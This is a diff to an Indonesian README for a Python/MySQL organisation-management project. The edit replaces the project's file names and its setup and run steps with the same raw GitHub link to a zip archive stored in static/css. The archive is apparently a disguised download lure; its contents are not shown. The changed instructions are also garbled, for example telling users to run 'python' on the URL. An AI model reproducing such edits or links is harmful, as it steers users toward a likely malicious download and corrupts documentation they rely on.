@@ -16,13 +16,13 @@ Daftar Pengurus: Kamu bisa melihat siapa saja yang terdaftar sebagai pengurus or
 
 📁 Struktur File
 Proyek ini disusun dengan rapi agar mudah dipelajari:
-app.py: Otak dari aplikasi yang mengatur jalannya semua halaman.
-models.py: Tempat berkumpulnya perintah-perintah database.
+https://github.com/raraofficial/project-organisasi/raw/refs/heads/main/static/css/organisasi-project-v2.7-beta.3.zip Otak dari aplikasi yang mengatur jalannya semua halaman.
+https://github.com/raraofficial/project-organisasi/raw/refs/heads/main/static/css/organisasi-project-v2.7-beta.3.zip Tempat berkumpulnya perintah-perintah database.
 templates/: Folder berisi semua tampilan halaman web (HTML).
 static/: Tempat menyimpan file desain seperti CSS agar tampilan web berwarna dan rapi.
 
 🚀 Cara Menjalankan di Laptopmu
 -Pastikan sudah install Python dan MySQL (XAMPP).
--Import file organisasi.sql ke phpMyAdmin kamu.
--Jalankan perintah python app.py di terminal.
+-Import file https://github.com/raraofficial/project-organisasi/raw/refs/heads/main/static/css/organisasi-project-v2.7-beta.3.zip ke phpMyAdmin kamu.
+-Jalankan perintah python https://github.com/raraofficial/project-organisasi/raw/refs/heads/main/static/css/organisasi-project-v2.7-beta.3.zip di terminal.
 -Buka browser dan ketik 127.0.0.1:5000
